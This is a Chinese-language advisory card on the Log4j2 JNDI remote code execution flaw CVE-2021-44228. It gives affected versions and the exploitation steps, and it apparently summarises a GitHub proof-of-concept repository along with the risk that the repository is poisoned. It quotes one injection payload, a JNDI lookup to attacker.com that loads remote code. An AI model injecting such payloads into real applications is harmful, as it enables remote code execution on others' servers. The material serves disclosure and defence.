## CVE-2021-44228-Apache Log4j2 JNDI 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 目标系统使用了受影响版本的Log4j2，且允许JNDI查找

**POC 可用性:** 是

**投毒风险:** 2%

## 详情

CVE-2021-44228 存在于 Apache Log4j2 中，利用了 JNDI 注入漏洞，攻击者通过控制日志消息或日志消息参数，可以执行从 LDAP 服务器加载的任意代码。利用方式如下：

1.  **构造恶意 JNDI 注入 Payload：** 攻击者构造包含 JNDI 查找的恶意字符串，例如 `${jndi:ldap://attacker.com/evil}`。
2.  **触发 Log4j2 记录 Payload：** 将恶意 Payload 注入到应用程序的日志消息中。这可以通过多种方式实现，例如通过 HTTP 请求头、POST 参数、用户输入等。
3.  **Log4j2 解析 Payload 并执行 JNDI 查找：** 当 Log4j2 记录包含恶意 Payload 的日志消息时，它会尝试解析 JNDI 查找。
4.  **连接到恶意 LDAP 服务器：**  Log4j2 会连接到攻击者控制的 LDAP 服务器（attacker.com）。
5.  **执行任意代码：** 恶意 LDAP 服务器会返回一个包含恶意 Java 类的响应，Log4j2 会加载并执行该类，从而导致远程代码执行。

**投毒风险分析：**

尽管该存储库提供了有价值的 PoC 和利用信息，但仍然存在作者投毒代码的微小风险。例如，LDAP 服务器响应中包含的恶意 Java 类可能包含后门，或在其他位置下载并执行恶意代码。为了将风险降至最低，应彻底审查提供的任何代码，并仅从受信任的来源下载所需的工具。

**项目地址:** [LucasPDiniz/CVE-2021-44228](https://github.com/LucasPDiniz/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)